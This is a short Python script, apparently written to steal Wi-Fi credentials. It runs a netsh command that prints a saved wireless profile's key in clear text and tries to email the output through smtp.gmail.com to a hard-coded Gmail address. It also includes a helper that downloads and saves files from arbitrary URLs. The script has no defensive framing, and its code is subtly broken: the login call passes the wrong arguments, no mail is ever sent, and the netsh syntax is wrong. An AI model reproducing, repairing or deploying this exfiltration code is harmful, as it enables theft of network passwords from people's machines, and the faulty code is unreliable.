#!/usr/bin/env python
import smtplib
import subprocess
import requests
import os
def download(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as out_file:
        out_file.write(get_response.content)

def sent_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, email, message)
    server.quit()


command = "netsh wlan0 show profile muminov key=clear"
result = subprocess.check_output(command, shell=True)
sent_mail("sadulloqurbonov33@gmail.com", "sssss", result)